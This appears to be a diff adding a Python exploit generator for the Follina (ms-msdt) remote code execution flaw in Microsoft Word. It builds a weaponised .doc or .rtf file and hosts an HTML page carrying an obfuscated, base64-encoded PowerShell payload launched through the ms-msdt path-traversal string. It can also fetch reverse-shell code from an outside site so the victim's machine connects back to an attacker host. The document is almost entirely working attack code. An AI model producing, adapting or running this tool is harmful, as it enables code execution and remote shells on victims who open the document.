@@ -1,0 +1,201 @@
+#!/usr/bin/env python3
+import os
+import sys
+import base64
+import shutil
+import socket
+import string
+import random
+import requests
+import argparse
+import tempfile
+import functools
+import threading
+import http.server
+import socketserver
+from rich import print
+from docx import Document
+
+TMP_DIR = tempfile.mkdtemp(prefix="follina_")
+DOC_DIR = TMP_DIR + '/doc'
+DOC_RELS_PATH = DOC_DIR + '/word/_rels/document.xml.rels'
+SERVER_DIR = TMP_DIR + '/www'
+
+
+def check_ip_port(ip, port):
+    """Check if and IP and Port is available"""
+
+    s = socket.socket()
+    status = True
+    try:
+        s.bind((ip, port))
+    except socket.error:
+        # Return false in case there are any binding errors regardless of status
+        status = False
+    s.close()
+    return status
+
+
+def start_server(ip, port):
+    """Serve SERVER_DIR over HTTP"""
+
+    Handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=SERVER_DIR)
+    httpd = socketserver.TCPServer((ip, port), Handler)
+    print(":globe_with_meridians:", f"Serving [magenta]{SERVER_DIR}[/magenta] over http://{ip}:{port}")
+    httpd.serve_forever()
+
+
+def eval_args(args):
+    """Perform preliminary checks"""
+
+    opt = dict()
+
+    # Get command to execute. If both -c and -r options are set, the latter is used
+    if args.reverse is None:
+        opt['cmd'] = args.command
+    else:
+        pair = args.reverse.split(":")
+        if (pair[0] == '' or pair[1] == ''):
+            print(":x:", "[bold][red]Invalid LHOST:LPORT combination[/red]")
+            sys.exit(-1)
+
+        # Fetch Reverse Shell code from 0day's website
+        opt['cmd'] = requests.get(
+            f"https://www.revshells.com/PowerShell%20%233?ip={pair[0]}&port={pair[1]}"
+        ).text
+
+    # Get Output filename
+    opt['output'] = args.output
+    if(not opt['output'].endswith(".doc") and
+        not opt['output'].endswith(".docx")):
+        print(":raised_hand:", 
+              "[bold][yellow]The output file does not end with .doc or .docx[/yellow]")
+
+    # Check if IP and port is available for hosting server
+    if (not check_ip_port(args.ip, args.port)):
+        print(":x:", f"[bold][red]Cannot start HTTP Server over {args.ip}:{args.port}")
+        sys.exit(-2)
+    opt['server_params'] = (args.ip, args. port)
+
+    # Check if the document needs to be exported in RTF
+    opt['rtf'] = args.rtf
+    print(":spiral_notepad:", f"Output File: [cyan]{opt['output']}[/cyan]")
+    if opt['rtf']:
+        print(":memo:", f"RTF mode: [magenta]ON[/magenta]")
+    print(":link:", f"Starting HTTP Server over: {opt['server_params'][0]}:{opt['server_params'][1]}")
+    print(":computer:", f"Command: [green]{opt['cmd']}[/green]")
+    return opt
+
+
+def docx_to_rtf(name):
+    f = open(name, 'rb')
+    document = Document(f)
+    document.save(f"{name}_rtf")
+    f.close()
+
+
+
+def prepare_malicious_doc(opt):
+    """Prepare Malicious Doc"""
+
+    # Check for skeleton file and move it to the staging directory
+    print(":fire:", "Preparing Malicious doc")
+    if not os.path.isdir("./doc"):
+        print(":x:", "[red]Could not find skeleton folder in current directory![/red]", file=sys.stderr)
+        sys.exit(-3)
+    shutil.copytree("doc", DOC_DIR)
+
+    # Put URL in as a staging template
+    rels_file = ""
+
+    if not os.path.isfile(DOC_RELS_PATH):
+        print(':x:', f"[red]Could not find {DOC_RELS_PATH}[/red]", file=sys.stderr)
+        sys.exit(-4)
+
+    with open(DOC_RELS_PATH) as f:
+        rels_file = f.read()
+
+    rels_file = rels_file.replace("{staged_html}", f"http://{opt['server_params'][0]}:{opt['server_params'][1]}/index.html")
+
+    with open(DOC_RELS_PATH, "w") as f:
+        f.write(rels_file)
+
+    # Re-build the original files
+    temp_fd, temp_file = tempfile.mkstemp(prefix="follina_", dir=TMP_DIR)
+    shutil.make_archive(temp_file, "zip", DOC_DIR)
+    os.rename(f"{temp_file}.zip", f"{TMP_DIR}/{opt['output']}")
+    os.close(temp_fd)
+
+    # Check if RTF Files needs to be generated
+    if opt['rtf']:
+        docx_to_rtf(f"{TMP_DIR}/{opt['output']}")
+        shutil.copy(f"{TMP_DIR}/{opt['output']}_rtf", f"{os.getcwd()}/{opt['output']}")
+    else:
+        shutil.copy(f"{TMP_DIR}/{opt['output']}", f"{os.getcwd()}/{opt['output']}")
+
+    print(":white_check_mark:", f"Created Malicios Doc: [red]{os.getcwd()}/{opt['output']}[/red]")
+
+
+def prepare_payload_html(opts):
+    payload = base64.b64encode(opts['cmd'].encode()).decode()
+    html_payload = f"""window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\"";"""
+
+    html_padding = f"<p>{''.join([random.choice(string.printable) for _ in range(4096)])}</p>"
+
+    html_doc = f"""<!doctype html>
+<html lang="en">
+    <head>
+        <title>You Have Been Follina'd</title>
+    </head>
+
+    <body>
+        {html_padding}
+    </body>
+
+    <script>
+        {html_payload}
+    </script>
+</html>
+    """
+
+    with open(f"{SERVER_DIR}/index.html", "w") as f:
+        f.write(html_doc)
+
+    print(":beetle:", f"Wrote payload to [magenta]{SERVER_DIR}/index.html[/magenta]")
+
+
+def main():
+    """Main Function"""
+
+    parser = argparse.ArgumentParser(description="[+] Exploit Generator for Follina")
+    parser.add_argument('-c', '--command', default="calc.exe",
+                        help="Command to execute on the remote system [Default: Calc]")
+    parser.add_argument('-o', '--output', default='exploit.doc',
+                        help="Name of output malicious Doc [Default: exploit.doc]")
+    parser.add_argument('-i', '--ip', default="127.0.0.1",
+                        help="Interface to bind http server to [Default: 127.0.0.1]")
+    parser.add_argument('-p', '--port', type=int, default=6969,
+                        help="Port to start http server on [Default: 6969]")
+    parser.add_argument('-0', '--rtf', action="store_true",
+                        help="Export in RTF format")
+    parser.add_argument('-r', '--reverse', metavar="LHOST:LPORT",
+                        help="IP and Port for reverse shell")
+    options = eval_args(parser.parse_args())
+
+    # Prepare Staging Docs
+    os.mkdir(SERVER_DIR)
+    print(":file_folder:",f"Staging Folder: [yellow]{TMP_DIR}[/yellow]")
+    prepare_payload_html(options)
+
+    # Start a daemon with our HTTP Server
+    thread = threading.Thread(target = start_server, 
+                              args=(options['server_params'][0], options['server_params'][1]))
+    thread.setdaemon = True
+    thread.start()
+
+    prepare_malicious_doc(options)
+
+
+if __name__=='__main__':
+    main()
+    
